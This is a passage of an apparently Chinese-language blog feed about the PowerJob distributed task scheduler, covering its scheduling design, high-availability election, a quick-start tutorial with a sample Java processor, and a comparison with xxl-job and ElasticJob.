调度后执行任务有一定的开销（涉及数据库操作），因此除了指针线程，还额外引入了处理线程池来保证调度的精度。源码一共 326 行，有兴趣的话，快去看吧，类名都给你准备好啦！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.github.kfcfans.powerjob.server.common.utils.timewheel.HashedWheelTimer</span><br></pre></td></tr></table></figure><h2 id="三、可靠调度——WAL"><a href="#三、可靠调度——WAL" class="headerlink" title="三、可靠调度——WAL"></a>三、可靠调度——WAL</h2><p>可靠调度也是大家广为关注的一个问题，甚至还有同学在 GitHub Issue 留言告诉我他们自研的调度系统在生产环境中遇到的不可靠调度问题：</p><p><img src="/img/powerjob/server3.png" alt="powerjob"> </p><p>那么 PowerJob 存在着错过调度的问题吗？<strong>答案显然是否定的</strong>。（作为一款一直强调极高可用性和稳定性的生产级调度中间件，要是这一点都做不到，那还有脸见人吗？</p><p>那么问题又来了，这，又是如何实现的呢？</p><p>不知道大家有没有听说过 <strong>WAL（Write-Ahead Logging，预写式日志）</strong>，这是主流关系型数据库（MS SQLServer、MySQL、Oracle）用来确保了事务原子性和持久性的关键技术。WAL 的核心思想是： <strong>在数据写入到数据库之前，先写入到日志中。</strong> 这样，在硬盘数据不损坏的情况下，预写式日志允许存储系统在崩溃后能够在日志的指导下恢复到崩溃前的状态，避免数据丢失。</p><p>PowerJob 为了实现任务的可靠调度，也借鉴了该思想。每一个任务被调度执行时，系统都会为其生成一条记录，这条记录包含了该任务实例（任务的一次运行叫任务实例）的预期调度时间。之后，PowerJob 会首先将该记录持久化到数据库中，只有持久化成功后，该任务才会被正式推入时间轮进行调度。</p><p>一旦这一台 server 宕机，任务没有被准时执行。其他 server 就能根据已经写入数据库中的任务实例记录将其恢复，做到可靠调度～</p><p>也就是说，只要你的系统中还有一台 powerjob-server 活着，就不会有缺失调度的情况。</p><h2 id="四、秒级任务"><a href="#四、秒级任务" class="headerlink" title="四、秒级任务"></a>四、秒级任务</h2><blockquote><p>说够了常规任务的调度，让我们来侃侃秒级任务～</p></blockquote><p>秒级任务的特点是运行频率极高（吐槽：这不是废话吗），那么能不能用支持常规任务调度的这套方法来支撑秒级任务的调度呢？</p><p>首先是任务的获取。emmm…“一定时间间隔扫描任务表获取待执行任务”，这…等你获取到任务，黄花菜都凉了…这不中啊…没错，使用传统调度方案，第一步就挂了。（我想到了路途艰难，但没想到居然那么难！）</p><p>不过，比较聪明的同学可能想到了。既然秒级任务执行频率很高，那 server 获取这个任务后，可以将它保存起来，这样下一次调度就不需要单独查数据库了，而是选择内存遍历，要多快有多快，似乎就解决了这个问题。</p><p>然而，这种方式仍不完美。俗话说得好，物以稀为贵，秒级任务的执行频率那么高，在大部分情况下，其实失败个一两次也没什么关系，毕竟立即就会有下一个任务补上。因此，传统任务那一套为了可靠调度而生的机制并不适用于秒级任务，秒级任务使用了那套机制后，也会对数据库产生较大的冲击，导致 PowerJob 整体的性能大幅度下降。那么出路究竟在何方呢？</p><p>此时就不得不提解决计算机领域问题的终极神器了：分治。既然不强要求任务执行有非常高的可靠性，那么 powerjob-server 此时就可以放权了。</p><p>每一个秒级任务，都会直接被投递到集群中的某一台 powerjob-worker 上，由 powerjob-worker 全权负责执行。而 powerjob-server 此时只需要负责故障恢复即可。</p><p>这样一来，server 的压力进一步减轻，同时，由于秒级任务的调度与执行全部落在了 worker 身上，调度的精度也会上升（至少能省下通讯的网络延迟），可谓是一个完美至极的双赢方案。</p>]]></content>
      
      
      <categories>
          
          <category> powerJob </category>
          
      </categories>
      
      
        <tags>
            
            <tag> powerJob </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>powerJob高可用原理</title>
      <link href="/2024/07/19/powerJob%E9%AB%98%E5%8F%AF%E7%94%A8%E5%8E%9F%E7%90%86/"/>
      <url>/2024/07/19/powerJob%E9%AB%98%E5%8F%AF%E7%94%A8%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="高可用实现背景"><a href="#高可用实现背景" class="headerlink" title="高可用实现背景"></a>高可用实现背景</h2><p>多实例部署 + 服务注册 + 服务发现这一套组合拳打下来，实现高可用那还不是分分钟的事情。所以很多人看到 PowerJob 的介绍页面中写了<strong>任意组件支持集群部署以实现高可用</strong>，想当然的以为也是走了上述的那套流程。然后看到系统依赖组件时，发现……emmm…… Zookeeper 呢？没看着。那找找 Nacos ？emmm……也没找着……不仅没找着，还发现文档中明明白白的写着，<strong>最小依赖仅为关系型数据库</strong>。许多用户看到这里就有点百思不得其解了，正常来讲都会有两个疑惑。</p><p>首先，为什么不用注册中心呢？</p><p>要做到分布式环境下的高可用，肯定是需要服务注册、服务发现这样的概念的。没有外部注册中心，说白了就是自己去实现了一套类似的机制。那为什么要怎么做呢？</p><p>其实答案很简单——成本。这个成本指的是用户的接入成本。对于一个需要部署的重型开源项目来说，每少一个外部依赖，就多一份潜在的用户。额外的系统依赖代表着额外的技术栈和额外的维护成本，如果企业本身没有这一套技术体系（比如没用到 zookeeper），而 PowerJob 又强依赖 zookeeper，那大概率只能说再见喽～</p><h2 id="简单高“可用”"><a href="#简单高“可用”" class="headerlink" title="简单高“可用”"></a>简单高“可用”</h2><p>PowerJob 系统中的基础组件为调度服务器 server 和执行器 worker，server 负责调度定时任务，并派发到 worker 执行，是一个典型的 C/S 架构。</p><p>C/S 架构下，如果目标是 server 和 client 可以相互联通的“高可用”，那么实现起来其实非常容易。</p><p>首先，启动多个 server 应用实例，集群部署。然后将多个 server 的 IP 地址统统填入 worker 的配置文件中，worker 启动时，随机找一个 IP 进行连接，失败则重试。一旦成功连接到某一台 server，就开始上报自己的地址信息。server 通过持有这个信息也可以和 worker 进行通讯。如此一来，一个最简单版本的“高可用”集群就搭建完成了。但是……它真的可用吗？</p><p>答案显然是否定的（否则也不会有这篇文章了是不是～）。以上方案主要存在两个问题：</p><ol><li>任务调度需要保证唯一性，即某个任务在某一个时刻只能被一台机器调度，否则就会导致重复执行。而前文提及的方案中，每一台 server 都是完全等价的，因此只能依靠分布式锁来保证唯一性，即抢到锁的 server 执行调度，其他 server 只能充当战地记者，默默地边缘 OB。这种方案下，无论部署多少台 server，系统整体的调度性能其实是固定的，多实例部署只能做到高可用，而不能做到高性能。</li><li>server 无法持有完整的 worker 集群信息。PowerJob 的定位是<strong>任务调度中间件</strong>，旨在为企业下各部门各业务线提供精准的调度和分布式计算能力。因此肯定会有集群分组的概念，就像 RocketMQ 中存在 ProducerGroup 和 ConsumerGroup 一样，PowerJob 有着 AppName 的概念。一个 AppName 逻辑上对应了某个应用下的一组任务，物理上对应了这个应用所部署的集群。为了便于 server 统一管理以及一些额外功能的实现（分布式计算），server 持有某一个 AppName 下完整的集群信息是一个强诉求，而前文提及的“瞎猫撞上死耗子”式方案，显然没办法做到这一点。</li></ol><p>基于以上两点，征途是星辰大海的 PowerJob 需要探索出一种更合理、更强大的高可用架构。</p><h2 id="powerJob-高可用实现思想"><a href="#powerJob-高可用实现思想" class="headerlink" title="powerJob 高可用实现思想"></a>powerJob 高可用实现思想</h2><p>worker 因为没办法获取 server 的准确状态，所以不能由 worker 来决定连接哪一台 server。因此，worker 需要做的，只是<strong>服务发现</strong>。即定时使用 HTTP 请求任意一台 server，请求获取当前该分组（appName）对应的 server。</p><p>而 server 收到来自 worker 的服务发现请求后，其实就是进行了一场小型的分布式选主：server 依赖的数据库中存在着 server_info 表，其中记录了每一个分组（appName）所对应的 server 信息。如果该 server 发现表中存在记录，那就说明该 worker 集群中已经有别的 worker 事先请求 server 进行选举，那么此时只需要发送 PING 请求检测该 server 是否存活。如果发现该 server 存活，那么直接返回该 server 的信息作为该分组的 server。否则就完成篡位，将自己的信息写入数据库表中，成为该分组的 server。</p><p>细心的小伙伴可能又要问了？发送 PING 请求检测该 server 是否存活，不还是有和刚才一样的问题吗？请求不同，发送方和接收方都有可能出问题，凭什么认为是原先的 server 挂了呢？</p><p>确实，在这个方案下，依旧没办法解决 server 到底挂没挂这个堪比“真假美猴王”的玄学问题。但是，这还重要吗？我们的目标是某个分组下所有的 worker 都连接到同一台 server，因此，即便产生那种误打误撞篡位的情况，在服务发现机制的加持下，整个集群最终还是会连接到同一台 server，完美实现我们的需求。</p>]]></content>
      
      
      <categories>
          
          <category> powerJob </category>
          
      </categories>
      
      
        <tags>
            
            <tag> powerJob </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>powerJob快速开始</title>
      <link href="/2024/06/18/powerJob%E5%BF%AB%E9%80%9F%E5%BC%80%E5%A7%8B/"/>
      <url>/2024/06/18/powerJob%E5%BF%AB%E9%80%9F%E5%BC%80%E5%A7%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="Java-分布式任务调度平台：PowerJob-快速开始-配置详解"><a href="#Java-分布式任务调度平台：PowerJob-快速开始-配置详解" class="headerlink" title="Java 分布式任务调度平台：PowerJob 快速开始+配置详解"></a>Java 分布式任务调度平台：PowerJob 快速开始+配置详解</h2><p>转发自HelloGitHub 推出的<a href="https://github.com/HelloGitHub-Team/Article" target="_blank" rel="noopener">《讲解开源项目》</a>系列。</p><blockquote><p>项目地址：</p><p><a href="https://github.com/KFCFans/PowerJob" target="_blank" rel="noopener">https://github.com/KFCFans/PowerJob</a></p></blockquote><p>PowerJob 的设计目标为企业级的分布式任务调度平台，即成为公司内部的调度中间件。整个公司统一部署调度中心 powerjob-server，旗下所有业务线应用只需要依赖 ‘powerjob-worker’ 即可接入获取任务调度与分布式计算能力。</p><p>因此，PowerJob 由调度服务器（powerjob-server）和执行器（powerjob-worker）两部分组成，powerjob-server 负责提供 Web 服务和完成任务的调度，powerjob-worker 则负责执行用户所编写的任务代码，同时提供分布式计算能力。</p><p>以下为在本地开发环境快速搭建并试用 PowerJob 的教程。</p><h2 id="一、STEP1-初始化项目"><a href="#一、STEP1-初始化项目" class="headerlink" title="一、STEP1: 初始化项目"></a>一、STEP1: 初始化项目</h2><ol><li><code>git clone https://github.com/KFCFans/PowerJob.git</code></li><li>导入 IDE，源码结构如下，我们需要启动调度服务器（powerjob-server），同时在 samples 工程中编写自己的处理器代码<br><img src="/img/powerjob/1.png" alt="powerjob"> </li></ol><h2 id="二、STEP2-启动调度服务器"><a href="#二、STEP2-启动调度服务器" class="headerlink" title="二、STEP2: 启动调度服务器"></a>二、STEP2: 启动调度服务器</h2><ol><li><p>创建数据库（不需要建表，只需要创建数据库）powerjob-daily</p></li><li><p>修改配置文件，配置文件的说明<a href="https://www.yuque.com/ohmyscheduler/guidence/bdvp1u#4DTFD" target="_blank" rel="noopener">官方文档</a>写的非常详细，此处不再赘述。由于是在本地 IDE 搭建测试环境，因此我们选择使用开发环境的配置文件 <code>application-daily.properties</code> 来修改并使用。需要修改的地方为数据库配置：</p><ul><li><code>spring.datasource.core.jdbc-url</code></li><li><code>spring.datasource.core.username</code></li><li><code>spring.datasource.core.password</code></li><li>当然，有 mongoDB 的同学也可以修改 <code>spring.data.mongodb.uri</code> 以获取完全版体验。</li></ul></li><li><p>完成配置文件的修改后，可以直接通过启动类 <code>OhMyApplication</code> 启动调度服务器，观察启动日志，查看是否启动成功～启动成功后，访问 <a href="http://127.0.0.1:7700/" target="_blank" rel="noopener">http://127.0.0.1:7700/</a> ，如果能顺利出现 Web 界面，则说明调度服务器启动成功！</p></li><li><p>注册应用：点击主页<strong>应用注册</strong>按钮，填入 <code>powerjob-agent-test</code> 和控制台密码（用于进入控制台），注册示例应用（当然你也可以注册其他的 appName，只是别忘记在示例程序中同步修改～）<br><img src="/img/powerjob/2.png" alt="powerjob"> </p></li></ol><h2 id="三、STEP3-编写示例代码"><a href="#三、STEP3-编写示例代码" class="headerlink" title="三、STEP3: 编写示例代码"></a>三、STEP3: 编写示例代码</h2><blockquote><p>进入示例工程（powerjob-worker-samples），修改配置文件连接 powerjob-server 并编写自己的处理器代码。</p></blockquote><ol><li><p>修改 powerjob-worker-samples 的启动配置类 <code>OhMySchedulerConfig</code>，<strong>将  <code>appName</code> 修改为刚刚在控制台注册的名称</strong>。</p></li><li><p>编写自己的处理器：在示例工程中新建一个类，继承你想要使用的处理器（各个处理器的介绍可见<a href="https://www.yuque.com/ohmyscheduler/guidence/hczm7m" target="_blank" rel="noopener">官方文档</a>），这里为了简单演示，选择使用单机处理器 <code>BasicProcessor</code> ，以下代码示例演示了在线日志功能的使用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf</span>4j</span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StandaloneProcessorDemo</span> <span class="keyword">implements</span> <span class="title">BasicProcessor</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ProcessResult <span class="title">process</span><span class="params">(TaskContext context)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        OmsLogger omsLogger = context.getOmsLogger();</span><br><span class="line">        omsLogger.info(<span class="string">"start process,context is &#123;&#125;."</span>, context);</span><br><span class="line">        System.out.println(<span class="string">"jobParams is "</span> + context.getJobParams());</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ProcessResult(<span class="keyword">true</span>, <span class="string">"process successfully~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>启动示例程序，即直接运行主类 <code>SampleApplication</code>，观察控制台输出信息，判断是否启动成功。</p></li></ol><h2 id="四、STEP4-任务的配置与运行"><a href="#四、STEP4-任务的配置与运行" class="headerlink" title="四、STEP4: 任务的配置与运行"></a>四、STEP4: 任务的配置与运行</h2><p>调度服务器与示例工程都启动完毕后，再次前往 Web 页面（ <a href="http://127.0.0.1:7700/" target="_blank" rel="noopener">http://127.0.0.1:7700/</a> ），进行任务的配置与运行。</p><ol><li><p>在首页输入框输入配置的应用名称，成功操作后会正式进入前端管理界面。<br><img src="/img/powerjob/3.png" alt="powerjob"> </p></li><li><p>点击任务管理 -&gt; 新建任务（右上角），开始创建任务。<br><img src="/img/powerjob/4.png" alt="powerjob"> </p></li><li><p>完成任务创建后，即可在控制台看到刚才创建的任务，如果觉得等待调度太过于漫长，可以直接点击<strong>运行</strong>按钮，立即运行本任务。<br><img src="/img/powerjob/5.png" alt="powerjob"> </p></li><li><p>前往<strong>任务示例</strong>边栏，查看任务的运行状态和在线日志<br><img src="/img/powerjob/6.png" alt="powerjob"> </p></li></ol><h3 id="4-1-基本配置"><a href="#4-1-基本配置" class="headerlink" title="4.1 基本配置"></a>4.1 基本配置</h3><ul><li>任务名称：名称</li><li>任务描述：描述</li><li>任务参数：任务处理时能够获取到的参数（即各个 Processor的process 方法入参 <code>TaskContext</code> 对象的 jobParams 属性）（进行一次处理器开发就能理解了）</li><li>定时信息：该任务的触发方式，由下拉框和输入框组成</li><li>API -&gt; 不需要填写任何参数，表明该任务由 OpenAPI 触发</li><li>CRON -&gt; 填写 CRON 表达式（<a href="https://cron.qqe2.com/" target="_blank" rel="noopener">在线生成网站</a>）</li><li>固定频率 -&gt; 填写整数，单位<strong>毫秒</strong></li><li>固定延迟 -&gt; 填写整数，单位<strong>毫秒</strong></li><li>工作流 -&gt; 不需要填写任何参数，表明该任务由工作流（workflow）触发</li></ul><h3 id="4-2-执行配置"><a href="#4-2-执行配置" class="headerlink" title="4.2 执行配置"></a>4.2 执行配置</h3><p>由执行类型（单机、广播和 MapReduce）、处理器类型和处理器参数组成，后两项相互关联。</p><ul><li>内置 Java 处理器 -&gt; 填写该处理器的<strong>全限定类名</strong>（eg，<code>com.github.kfcfans.oms.processors.demo.MapReduceProcessorDemo</code>）</li><li>Java（容器） -&gt; 填写<strong>容器ID#处理器全限定类名</strong>（eg，<code>18#com.github.kfcfans.oms.container.DemoProcessor</code>）</li><li>SHELL -&gt; 填写需要处理的脚本（直接复制文件内容）或脚本下载链接（<a href="http://xxx）" target="_blank" rel="noopener">http://xxx）</a></li><li>PYTHON -&gt; 填写完整的 python 脚本或下载链接（<a href="http://xxx）" target="_blank" rel="noopener">http://xxx）</a></li></ul><h3 id="4-3-运行配置"><a href="#4-3-运行配置" class="headerlink" title="4.3 运行配置"></a>4.3 运行配置</h3><ul><li>最大实例数：该任务同时执行的数量</li><li>单机线程并发数：该实例执行过程中每个 Worker 使用的线程数量（MapReduce 任务生效，其余无论填什么，都只会使用必要的线程数…）</li><li>运行时间限制：限定任务的最大运行时间，超时则视为失败，单位<strong>毫秒</strong>，0 代表不限制超时时间（<strong>不建议不限制超时时间</strong>）。</li></ul><h3 id="4-4-重试配置"><a href="#4-4-重试配置" class="headerlink" title="4.4 重试配置"></a>4.4 重试配置</h3><ul><li>Instance 重试次数：实例级别，失败了整个任务实例重试，会更换 TaskTracker（本次任务实例的Master节点），代价较大，大型 Map/MapReduce 慎用。</li><li>Task重试次数：Task 级别，每个子 Task 失败后单独重试，会更换 ProcessorTracker（本次任务实际执行的 Worker 节点），代价较小，推荐使用。</li><li>注：<strong>请注意同时配置任务重试次数和子任务重试次数之后的重试放大</strong>，比如对于单机任务来说，假如任务重试次数和子任务重试次数都配置了 1 且都执行失败，实际执行次数会变成 4 次！推荐任务实例重试配置为 0，子任务重试次数根据实际情况配置。</li></ul><h3 id="4-5-机器配置"><a href="#4-5-机器配置" class="headerlink" title="4.5 机器配置"></a>4.5 机器配置</h3><p>用来标明允许执行任务的机器状态，避开那些摇摇欲坠的机器，0 代表无任何限制。</p><ul><li>最低 CPU 核心数：填写浮点数，CPU 可用核心数小于该值的 Worker 将不会执行该任务。</li><li>最低内存（GB）：填写浮点数，可用内存小于该值的 Worker 将不会执行该任务。</li><li>最低磁盘（GB）：填写浮点数，可用磁盘空间小于该值的 Worker 将不会执行该任务。</li></ul><h3 id="4-6-集群配置"><a href="#4-6-集群配置" class="headerlink" title="4.6 集群配置"></a>4.6 集群配置</h3><ul><li>执行机器地址：指定集群中的某几台机器执行任务（debug 的好帮手），多值英文逗号分割，如<code>192.168.1.1:27777,192.168.1.2:27777</code></li><li>最大执行机器数量：限定调动执行的机器数量</li></ul><h3 id="4-7-报警配置"><a href="#4-7-报警配置" class="headerlink" title="4.7 报警配置"></a>4.7 报警配置</h3><p>选择任务执行失败后报警通知的对象，需要事先录入。</p><p>基础的教程到这里也就结束了～更多功能示例可见<a href="https://www.yuque.com/ohmyscheduler/guidence/ysug77" target="_blank" rel="noopener">官方文档</a>，工作流、MapReduce、容器等高级特性等你来探索！</p>]]></content>
      
      
      <categories>
          
          <category> powerJob </category>
          
      </categories>
      
      
        <tags>
            
            <tag> powerJob </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>powerJob调研报告</title>
      <link href="/2024/05/16/powerJob%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/"/>
      <url>/2024/05/16/powerJob%E8%B0%83%E7%A0%94%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>PowerJob 可以被认为是第三代任务调度框架，在任务调度的基础上，还额外提供了分布式计算和工作流功能，其主要特性如下：</p><ul><li>使用简单：提供 Web 界面，允许开发者可视化地完成调度任务的管理（增、删、改、查）、任务运行状态监控和运行日志查看等功能。</li><li>定时策略完善：支持 CRON 表达式、固定频率、固定延迟和API四种定时调度策略。</li><li>执行模式丰富：支持单机、广播、Map、MapReduce 四种执行模式，其中 Map/MapReduce 处理器能使开发者寥寥数行代码便获得集群分布式计算的能力。</li><li>工作流（workflow）支持：支持在线配置任务依赖关系，可视化得对任务进行编排，同时还支持上下游任务间的数据传递</li><li>执行器支持广泛：支持 Spring Bean、内置/外置 Java 类、Shell、Python 等处理器，应用范围广。</li><li>运维便捷：支持在线日志功能，执行器产生的日志可以在前端控制台页面实时显示，降低 debug 成本，极大地提高开发效率。</li><li>依赖精简：最小仅依赖关系型数据库（MySQL/PostgreSQL/Oracle/MS SQLServer 等），同时支持所有 Spring Data JPA 所支持的关系型数据库。</li><li>高可用&amp;高性能：调度服务器经过精心设计，一改其他调度框架基于数据库锁的策略，实现了无锁化调度。部署多个调度服务器可以同时实现高可用和性能的提升（支持无限的水平扩展）。</li><li>故障转移与恢复：任务执行失败后，可根据配置的重试策略完成重试，只要执行器集群有足够的计算节点，任务就能顺利完成。</li></ul><h2 id="PowerJob-适用场景"><a href="#PowerJob-适用场景" class="headerlink" title="PowerJob 适用场景"></a>PowerJob 适用场景</h2><p>综上所述，PowerJob 是全新一代分布式调度与计算框架，能让您轻松完成任务的调度与繁杂任务的分布式计算。适用于各个有任务调度需求的企业，统一部署 Server 做为整个公司的公共调度平台，成为分布式调度的中间件。</p><ul><li>有定时执行需求的业务场景：如每天凌晨全量同步数据、生成业务报表等。</li><li>有需要全部机器一同执行的业务场景：如使用广播执行模式清理集群日志。</li><li>有需要分布式处理的业务场景：比如需要更新一大批数据，单机执行耗时非常长，可以使用 Map/MapReduce 处理器完成任务的分发，调动整个集群加速计算。</li></ul><h2 id="PowerJob与同类型产品对比"><a href="#PowerJob与同类型产品对比" class="headerlink" title="PowerJob与同类型产品对比"></a>PowerJob与同类型产品对比</h2><div class="table-container"><table><thead><tr><th></th><th>QuartZ</th><th>xxl-job</th><th>ElasticJob</th><th>SchedulerX 2.0</th><th><strong>PowerJob</strong></th></tr></thead><tbody><tr><td>定时类型</td><td>CRON</td><td>CRON</td><td>CRON、OpenAPI</td><td>CRON、固定频率、固定延迟、OpenAPI</td><td><strong>CRON**</strong>（15秒以上）、固定频率、固定延迟（控制台设置的2倍时间）、OpenAPI**</td></tr><tr><td>任务类型</td><td>内置Java</td><td>内置Java、GLUE Java、Shell、Python等脚本</td><td>内置Java、Shell、Python等脚本</td><td>内置Java、外置Java（FatJar）、Shell、Python等脚本</td><td><strong>内置Java、外置Java（容器）、Shell、Python等脚本</strong></td></tr><tr><td>分布式任务</td><td>无</td><td>静态分片</td><td>静态分片</td><td>MapReduce 动态分片</td><td><strong>MapReduce</strong> <strong>动态分片</strong></td></tr><tr><td>在线任务治理</td><td>不支持</td><td>支持</td><td>支持</td><td>支持</td><td><strong>支持</strong></td></tr><tr><td>日志白屏化</td><td>不支持</td><td>支持</td><td>添加 <strong>ElasticJob-UI**</strong>组件后支持**</td><td>不支持</td><td><strong>支持</strong></td></tr><tr><td>调度方式及性能</td><td>基于数据库锁，有性能瓶颈</td><td>基于数据库锁，有性能瓶颈</td><td>基于Zookeeper分布式锁，调度端可以动态水平扩容，高可用高性能。</td><td>不详（云服务的功能决定，那边控制限流后性能自然会降低）</td><td><strong>无锁化设计（调度端调度任务这一操作无锁），性能强劲无上限</strong></td></tr><tr><td>报警监控</td><td>无</td><td>邮件</td><td>邮件、企业微信、钉钉</td><td>短信</td><td><strong>邮件，提供接口允许开发者扩展</strong></td></tr><tr><td>系统依赖</td><td>关系型数据库（MySQL、Oracle…）</td><td>MySQL</td><td>Zookeeper</td><td>人民币</td><td><strong>任意 Spring Data  Jpa支持的关系型数据库（MySQL、Oracle…）</strong></td></tr><tr><td>DAG 工作流</td><td>不支持</td><td>不支持</td><td>有简单流处理，DAG官网显示todo（在做了但不知道啥时候做完）</td><td>支持</td><td><strong>支持</strong></td></tr></tbody></table></div><h2 id="技术选型总结"><a href="#技术选型总结" class="headerlink" title="技术选型总结"></a>技术选型总结</h2><p>PowerJob：</p><ul><li><p>优点: </p><p>​    相较于xxl-job和ElasticJob，power job调度操作无锁，更具备高并发高性能优势。    </p><p>​    相较于ElasticJob更轻量级，没有其他必须的中间件支持，方便管理。</p><p>​    相较于xxl-job必须使用mysql，powerJob支持的数据库连接总类丰富，对数据库的操作大多使用spring     data jpa实现，理论上只要jpa支持的数据库都可以使用。</p><p>​    系统设计理论基于阿里的自研中间件Schedulerx2.0，具备Map/Reduce大数据分布式计算、DAG工作流调度、脚本调度、API、容器(JVM 级容器jar包，非操作系统级容器Docker)执行等高级功能。</p><p>​    PowerJob的调度中心具备高性能特性，调度中心只关注调度任务及其结果，定时任务的执行压力都被分摊到各个worker执行端（使用调度服务的应用端），且如果定时执行时间达到毫秒级别(非cron表达式的前提)任务的下次执行时间等计算也都交给执行端，调度中心CPU计算压力较小性能高。</p></li><li><p>缺点:</p><p>​    社区相对没有xxl-job和ElasticJob活跃，github上关注人数没有另外2个多，开发测试人员较少，测试覆盖范围可能没有其他2个广(MySqlSeriesDfsService这个容器高级特性的实现类注解写明官方只基于mysql进行了测试)。</p><p>​    对于没有分布式计算、集群控制等高级特性使用需求的话会导致部分线程空转影响性能。</p><pre><code> 调度中心不支持动态扩容，需停机重新发版。</code></pre><p>​    使用jpa考虑了使用各种数据库的兼容性，但很多地方如果改成对应库的sql查询能提高很大的性能(将foreach循环中的调度jpa查询库改成单个sql查询结果)。</p></li></ul><p>xxl-job:</p><ul><li><p>优点:</p><p>非常轻量级，相较于powerJob和ElasticJob轻量、简单、易上手。</p><p>社区活跃，github上关注最多，测试覆盖面全，问题方便排查。</p></li><li><p>缺点:</p><p>基于数据库锁实现分布式锁避免重复调度(select for update), 避免了重复调度问题但加锁减少了并发能力。</p><p>不支持powerJob提供的高级特性，数据库支持种类单一强依赖mysql。</p><p>调度中心不支持动态扩容。</p></li></ul><p>ElasticJob:</p><ul><li><p>优点:</p><p>服务发现与注册端zookeeper支持动态扩容。</p><p>Apache ShardingSphere 的子项目，开发维护人员较多，使用广泛。</p></li><li><p>缺点:</p><p>相较于xxl-job和powerJob添加了zookeeper的依赖。</p><p>不支持powerJob提供的map/Reduce分布式计算、DAG工作流等高级特性。</p><p>Elastic-Job的弹性分布式功能强依赖zookeeper，zookeeper容易成为性能瓶颈。</p><p>任务划分的分片数可能小于执行任务的实例数，导致一些机器空转。</p></li></ul><h2 id="使用须知"><a href="#使用须知" class="headerlink" title="使用须知"></a>使用须知</h2><h3 id="部署顺序"><a href="#部署顺序" class="headerlink" title="部署顺序"></a>部署顺序</h3><p>Power-job作者基于快速失败考虑，各个worker调度端(应用端)系统必须成功连接到server端(power-job调度中心应用)才能启动，所以在补丁维护，系统重启等情况下需要先启动应用powerjob-server</p><h3 id="端口开放控制"><a href="#端口开放控制" class="headerlink" title="端口开放控制"></a>端口开放控制</h3><p><strong>最省事的方法：所有端口（7700 + 10086 + 10010）全打开。</strong>如果你想精细化控制端口，那么请遵循以下原则自行设置：</p><ol><li>对于任何用户，7700 为<strong>调度服务器（powerjob-server）的 Web 服务端口，必须打开</strong></li><li>oms.协议.port 的端口按需打开，考虑 server-server 和 server-worker 通讯的场景：</li></ol><p>l 比如 server-server 默认通过 HTTP 协议交互（参数 oms.transporter.main.protocol控制），那必须打开 HTTP 10010 端口</p><p>l 同时 server-worker 部分通过 HTTP，部分通过 AKKA，则仍需要打开 AKKA 的 10086 端口</p><h3 id="官方产品手册未提及的可能导致bug的特性"><a href="#官方产品手册未提及的可能导致bug的特性" class="headerlink" title="官方产品手册未提及的可能导致bug的特性"></a>官方产品手册未提及的可能导致bug的特性</h3><h4 id="1-低于15秒的cron表达式执行间隔为15秒"><a href="#1-低于15秒的cron表达式执行间隔为15秒" class="headerlink" title="1.低于15秒的cron表达式执行间隔为15秒"></a>1.低于15秒的cron表达式执行间隔为15秒</h4><p><img src="/img/powerJob/powerJob0.png" alt="powerJob"> </p><p><img src="/img/powerJob/powerJob1.png" alt="powerJob"> </p><p><img src="/img/powerJob/powerJob2.png" alt="powerJob"> </p><h4 id="2-固定延迟执行时间与预期不符，不建议使用"><a href="#2-固定延迟执行时间与预期不符，不建议使用" class="headerlink" title="2.固定延迟执行时间与预期不符，不建议使用"></a>2.固定延迟执行时间与预期不符，不建议使用</h4><p>示例:</p><p>控制台配置固定延迟为8秒，延迟时间并发期望的8秒，且会立即执行一次</p><p><img src="/img/powerJob/powerJob3.png" alt="powerJob"> </p><p><img src="/img/powerJob/powerJob4.png" alt="powerJob"> </p><p><img src="/img/powerJob/powerJob5.png" alt="powerJob"> </p><p><img src="/img/powerJob/powerJob6.png" alt="powerJob"> </p><p><img src="/img/powerJob/powerJob7.png" alt="powerJob"> </p><h4 id="3-固定频率源码限制死了不能低于50毫秒间隔频率但是返回异常要求频率应高于1000毫秒"><a href="#3-固定频率源码限制死了不能低于50毫秒间隔频率但是返回异常要求频率应高于1000毫秒" class="headerlink" title="3. 固定频率源码限制死了不能低于50毫秒间隔频率但是返回异常要求频率应高于1000毫秒"></a>3. 固定频率源码限制死了不能低于50毫秒间隔频率但是返回异常要求频率应高于1000毫秒</h4><p><img src="/img/powerJob/powerJob8.png" alt="powerJob"> </p><h3 id="代码配置-开发"><a href="#代码配置-开发" class="headerlink" title="代码配置(开发)"></a>代码配置(开发)</h3><h4 id="yaml-amp-properties-配置注意-开发"><a href="#yaml-amp-properties-配置注意-开发" class="headerlink" title="yaml &amp; properties 配置注意(开发)"></a>yaml &amp; properties 配置注意(开发)</h4><p>使用部署调度端之前请删除&amp;添加以下配置:</p><p>l 添加配置(非必须)：</p><p>下面配置用以提升批量插入情况下性能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spring.jpa.properties.hibernate.jdbc.batch_size&#x3D;1000</span><br><span 